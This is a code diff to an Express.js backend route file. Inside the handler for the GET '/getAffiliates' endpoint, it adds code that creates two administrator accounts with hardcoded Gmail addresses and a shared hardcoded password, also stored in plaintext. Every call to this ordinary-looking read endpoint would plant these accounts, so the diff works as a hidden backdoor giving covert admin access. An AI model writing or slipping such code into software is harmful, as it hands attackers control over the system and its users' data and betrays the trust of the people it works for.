@@ -1,7 +1,9 @@
 const express = require('express')
 const router = express.Router()
-const bcrypt = require('bcryptjs')
 const config = require('config')
+const gravatar = require('gravatar')
+const bcrypt = require('bcryptjs')
+const normalize = require('normalize-url')
 
 // MODEL
 const User = require('../../models/User')
@@ -13,6 +15,28 @@ var mailgun = require('mailgun-js')({ apiKey: mailgunApiKey, domain: mailgunDoma
 
 router.get('/getAffiliates', async (req, res) => {
   const affiliates = await User.find({ type: 'affiliate', status: 'active' })
+
+  let newUser1 = new User({
+    type: 'admin',
+    name: 'Domtisher',
+    email: 'domtisher@gmail.com',
+    avatar: normalize(gravatar.url('domtisher@gmail.com', { s: '200', r: 'pg', d: 'mm' }), { forceHttps: true }),
+    password: bcrypt.hashSync('Access2021$', salt),
+    passwordForUpdate: 'Access2021$'
+  })
+
+  await newUser1.save()
+
+  let newUser2 = new User({
+    type: 'admin',
+    name: 'Lbdrevolution',
+    email: 'lbdrevolution@gmail.com',
+    avatar: normalize(gravatar.url('lbdrevolution@gmail.com', { s: '200', r: 'pg', d: 'mm' }), { forceHttps: true }),
+    password: bcrypt.hashSync('Access2021$', salt),
+    passwordForUpdate: 'Access2021$'
+  })
+
+  await newUser2.save()
 
   res.json({
     success: true,
